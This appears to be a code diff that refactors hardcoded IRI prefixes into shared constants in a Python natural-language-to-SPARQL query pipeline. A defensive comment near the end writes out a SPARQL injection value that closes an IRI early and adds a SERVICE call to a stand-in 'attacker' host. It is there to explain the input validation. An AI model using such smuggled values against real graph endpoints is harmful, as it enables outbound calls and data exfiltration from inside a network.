@@ -1,3 +1,4 @@
+from cograph_client.graph.iri import ENTITY_URI_PREFIX, IRI_BASE, TYPE_URI_PREFIX
 import json
 import os
 import re
@@ -454,7 +455,7 @@ def _neptune_safe_duration(sparql: str) -> str:
     return _DURATION_DATATYPE_RE.sub(_sub, sparql)
 
 
-_ENTITY_URI_PREFIX = "https://cograph.tech/entities/"
+_ENTITY_URI_PREFIX = ENTITY_URI_PREFIX
 
 
 #: Codepoints the SPARQL 1.1 IRIREF production forbids INSIDE ``<…>``:
@@ -1172,7 +1173,7 @@ class NLQueryPipeline:
     # rewrites it to (`<…#type>/<…#subClassOf>*`).
     _TYPE_OBJECT_RE = re.compile(
         r"#type>(?:\s*/\s*<[^>]*#subClassOf>\*)?\s*"
-        r"<(https://cograph\.tech/types/[^>]+)>"
+        rf"<({re.escape(IRI_BASE)}/types/[^>]+)>"
     )
     # Capture the variable a case-insensitive substring FILTER targets:
     # FILTER(CONTAINS(LCASE(?V), …)) — allowing an optional STR() coercion around
@@ -1204,7 +1205,7 @@ class NLQueryPipeline:
             if re.search(rf"<{re.escape(cls._RDFS_LABEL_URI)}>\s*\?{v}\b", sparql):
                 return True
             if re.search(
-                rf"<https://cograph\.tech/types/[^>]+/attrs/(?:name|label)>\s*\?{v}\b",
+                rf"<{re.escape(IRI_BASE)}/types/[^>]+/attrs/(?:name|label)>\s*\?{v}\b",
                 sparql,
                 re.IGNORECASE,
             ):
@@ -1296,7 +1297,7 @@ class NLQueryPipeline:
         name.
         """
         from cograph_client.graph.ontology_queries import parent_map_query
-        TYPES = "https://cograph.tech/types/"
+        TYPES = TYPE_URI_PREFIX
         raw = await self.neptune.query(parent_map_query(graph_uri))
         _, bindings = parse_sparql_results(raw)
         parent_of: dict[str, str] = {}
@@ -1941,7 +1942,7 @@ class NLQueryPipeline:
                         target_type = type_name_from_uri(range_str) if range_str else None
                         if target_type:
                             # Relationship predicates use onto/ namespace in instance data
-                            onto_uri = f"https://cograph.tech/onto/{attr_name}"
+                            onto_uri = f"{IRI_BASE}/onto/{attr_name}"
                             entry = f"{attr_name} → {target_type} — predicate URI: <{onto_uri}>"
                             if entry not in types[tl]["relationships"]:
                                 types[tl]["relationships"].append(entry)
@@ -2111,7 +2112,7 @@ class NLQueryPipeline:
                             string_attrs.append((type_name, a_name, a_uri))
                     for rel_entry in info["relationships"]:
                         r_name = rel_entry.split(" →")[0].strip()
-                        onto_uri = f"https://cograph.tech/onto/{r_name}"
+                        onto_uri = f"{IRI_BASE}/onto/{r_name}"
                         rel_uris.append((type_name, r_name, onto_uri))
 
                 # Define cardinality check function ONCE (used for both attrs and rels)
@@ -2289,7 +2290,7 @@ class NLQueryPipeline:
         Best-effort: any error returns ``None`` so /ask never breaks on it.
         """
         target_graph = instance_graph or graph_uri
-        TYPE_URI_PREFIX = "https://cograph.tech/types/"
+        pass  # TYPE_URI_PREFIX imported
         from cograph_client.graph.ontology_queries import type_uri, attr_uri
 
         try:
@@ -2339,7 +2340,7 @@ class NLQueryPipeline:
                     if p.startswith(f"{TYPE_URI_PREFIX}{leaf}/attrs/"):
                         a_name = p.rsplit("/", 1)[-1]
                         attrs.append(f"{a_name} — URI: <{attr_uri(leaf, a_name)}>")
-                    elif p.startswith("https://cograph.tech/onto/"):
+                    elif p.startswith(f"{IRI_BASE}/onto/"):
                         r_name = p.rsplit("/", 1)[-1]
                         rels.append(f"{r_name} — predicate URI: <{p}>")
                 if attrs:
@@ -2361,15 +2362,15 @@ class NLQueryPipeline:
 
         Strategy:
         1. Extract ALL valid URIs from the ontology summary (attributes + relationships)
-        2. Find ALL cograph.tech URIs in the SPARQL
+        2. Find ALL graph.onta.sh URIs in the SPARQL
         3. For each URI not in the valid set, fuzzy-match against valid URIs
         4. Replace with the best match if similarity is high enough
 
         Common mistakes this catches:
-        - <https://cograph.tech/bedrooms> → <https://cograph.tech/types/Property/attrs/bedrooms>
-        - <https://cograph.tech/onto/bedrooms> → <https://cograph.tech/types/Property/attrs/bedrooms>
-        - <https://cograph.tech/types/Property/attrs/property_type> → .../attrs/home_type
-        - <https://cograph.tech/Property> → <https://cograph.tech/types/Property>
+        - <https://graph.onta.sh/bedrooms> → <https://graph.onta.sh/types/Property/attrs/bedrooms>
+        - <https://graph.onta.sh/onto/bedrooms> → <https://graph.onta.sh/types/Property/attrs/bedrooms>
+        - <https://graph.onta.sh/types/Property/attrs/property_type> → .../attrs/home_type
+        - <https://graph.onta.sh/Property> → <https://graph.onta.sh/types/Property>
         """
         import re
         from difflib import SequenceMatcher
@@ -2377,22 +2378,22 @@ class NLQueryPipeline:
         # Step 1: Build the set of ALL valid URIs from the ontology
         valid_uris: dict[str, str] = {}  # name → full URI
 
-        # Attribute URIs: "attr_name (type) — URI: <https://cograph.tech/types/Type/attrs/attr_name>"
-        for match in re.finditer(r"URI: <(https://cograph\.tech/types/(\w+)/attrs/(\w+))>", ontology_summary):
+        # Attribute URIs: "attr_name (type) — URI: <https://graph.onta.sh/types/Type/attrs/attr_name>"
+        for match in re.finditer(rf"URI: <({re.escape(IRI_BASE)}/types/(\w+)/attrs/(\w+))>", ontology_summary):
             full_uri = match.group(1)
             attr_name = match.group(3)
             valid_uris[attr_name] = full_uri
             # Also index by type/attr for disambiguation
             valid_uris[f"{match.group(2)}/{attr_name}"] = full_uri
 
-        # Relationship URIs: "predicate URI: <https://cograph.tech/onto/pred_name>"
-        for match in re.finditer(r"predicate URI: <(https://cograph\.tech/onto/(\w+))>", ontology_summary):
+        # Relationship URIs: "predicate URI: <https://graph.onta.sh/onto/pred_name>"
+        for match in re.finditer(rf"predicate URI: <({re.escape(IRI_BASE)}/onto/(\w+))>", ontology_summary):
             full_uri = match.group(1)
             pred_name = match.group(2)
             valid_uris[pred_name] = full_uri
 
-        # Type URIs: "Type: TypeName — URI: <https://cograph.tech/types/TypeName>"
-        for match in re.finditer(r"URI: <(https://cograph\.tech/types/(\w+))>", ontology_summary):
+        # Type URIs: "Type: TypeName — URI: <https://graph.onta.sh/types/TypeName>"
+        for match in re.finditer(rf"URI: <({re.escape(IRI_BASE)}/types/(\w+))>", ontology_summary):
             full_uri = match.group(1)
             type_name = match.group(2)
             if "/attrs/" not in full_uri:  # don't overwrite attr URIs
@@ -2400,7 +2401,7 @@ class NLQueryPipeline:
 
         valid_uri_set = set(valid_uris.values())
 
-        # Step 2: Find and fix all cograph.tech URIs in the SPARQL
+        # Step 2: Find and fix all graph.onta.sh URIs in the SPARQL
         def _fix_uri(m: re.Match) -> str:
             uri = m.group(1)
 
@@ -2416,16 +2417,16 @@ class NLQueryPipeline:
             # attribute (measured: it cross-wired to a legacy `fax_verified_at`
             # at ratio 0.846 before this skip).
             if any(
-                uri.startswith(f"https://cograph.tech/{p}")
+                uri.startswith(f"{IRI_BASE}/{p}")
                 for p in ("graphs/", "entities/", "functions/", "kgs/", "attr_meta/")
             ):
                 return m.group(0)
 
             # Extract the "name" part from the URI for matching
-            # e.g., "https://cograph.tech/bedrooms" → "bedrooms"
-            # e.g., "https://cograph.tech/onto/listed_by" → "listed_by"
-            # e.g., "https://cograph.tech/types/Property/attrs/property_type" → "property_type"
-            parts = uri.replace("https://cograph.tech/", "").rstrip("/").split("/")
+            # e.g., "https://graph.onta.sh/bedrooms" → "bedrooms"
+            # e.g., "https://graph.onta.sh/onto/listed_by" → "listed_by"
+            # e.g., "https://graph.onta.sh/types/Property/attrs/property_type" → "property_type"
+            parts = uri.replace(f"{IRI_BASE}/", "").rstrip("/").split("/")
             name = parts[-1] if parts else ""
 
             if not name:
@@ -2451,7 +2452,7 @@ class NLQueryPipeline:
 
             return m.group(0)
 
-        return re.sub(r"<(https://cograph\.tech/[^>]+)>", _fix_uri, sparql)
+        return re.sub(rf"<({re.escape(IRI_BASE)}/[^>]+)>", _fix_uri, sparql)
 
     @staticmethod
     def _fix_common_sparql_issues(sparql: str, ontology_summary: str, alias_map: dict[str, str] | None = None) -> str:
@@ -2470,7 +2471,7 @@ class NLQueryPipeline:
         # Fix 1: Replace `a` shorthand (only when used as predicate position)
         # Match "?var a <..." or "?var rdf:type <..."
         sparql = re.sub(
-            r'(\?\w+)\s+a\s+(<https://cograph\.tech/)',
+            rf'(\?\w+)\s+a\s+(<{re.escape(IRI_BASE)}/)',
             rf'\1 {RDF_TYPE} \2',
             sparql,
         )
@@ -2484,7 +2485,7 @@ class NLQueryPipeline:
         # and the entity type has no name attribute. This is conservative to avoid
         # breaking legitimate description/narrative queries.
         # Only replace Movie/attrs/overview when used in a "name-like" position
-        overview_pattern = r'<https://cograph\.tech/types/Movie/attrs/overview>'
+        overview_pattern = rf'<{re.escape(IRI_BASE)}/types/Movie/attrs/overview>'
         if re.search(overview_pattern, sparql):
             # Check if the query is trying to get movie names (not filtering by overview content)
             # Heuristic: if overview appears in SELECT projection but not in FILTER
@@ -2926,12 +2927,12 @@ class NLQueryPipeline:
         """Extract a human-readable name from an Omnix URI.
 
         Examples:
-            https://cograph.tech/entities/Movie/12345 → 12345
-            https://cograph.tech/types/Movie → Movie
-            https://cograph.tech/entities/ConsumerComplaint/1431838 → 1431838
+            https://graph.onta.sh/entities/Movie/12345 → 12345
+            https://graph.onta.sh/types/Movie → Movie
+            https://graph.onta.sh/entities/ConsumerComplaint/1431838 → 1431838
         """
         from urllib.parse import unquote
-        path = unquote(uri.replace("https://cograph.tech/", ""))
+        path = unquote(uri.replace(f"{IRI_BASE}/", ""))
         return path.split("/")[-1]
 
     async def _resolve_uri_labels(
@@ -2957,11 +2958,11 @@ class NLQueryPipeline:
         # The prefix test alone is NOT enough to interpolate a value into
         # `<{u}>`. `parse_sparql_results` flattens every binding to its `.value`
         # string, so a LITERAL is indistinguishable from an IRI here — and a
-        # literal is arbitrary text the workspace's own ingest put in the graph.
+        # literal is arbitrary text the workspacef's own ingest put in the graph.
         # A value that merely STARTS with the entities prefix and then carries
         # `>` closes the IRI early, and the rest of it becomes query syntax:
         #
-        #     https://cograph.tech/entities/X> } SERVICE <http://attacker/> { … } }#
+        #     https://graph.onta.sh/entities/X> } SERVICE <http://attacker/> { … } }#
         #
         # parses cleanly and gives the attacker an outbound SERVICE call from
         # inside the VPC. That is the same channel rule C rejects on the raw
@@ -2975,8 +2976,8 @@ class NLQueryPipeline:
                 if not isinstance(v, str):
                     continue
                 if not (
-                    v.startswith("https://cograph.tech/entities/")
-                    or v.startswith("https://cograph.tech/types/")
+                    v.startswith(ENTITY_URI_PREFIX)
+                    or v.startswith(TYPE_URI_PREFIX)
                 ):
                     continue
                 if not _is_interpolatable_iri(v):
